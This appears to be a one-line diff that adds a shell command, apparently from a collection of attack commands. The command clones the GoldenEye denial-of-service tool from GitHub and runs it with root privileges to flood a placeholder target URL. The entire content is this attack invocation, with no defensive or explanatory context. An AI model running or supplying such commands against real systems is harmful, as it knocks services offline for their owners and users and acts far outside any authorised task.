@@ -1,0 +1,1 @@
+cd ddos-dos && git clone https://github.com/jseidl/GoldenEye.git && cd GoldenEye && sudo python3 goldeneye.py http://target.com
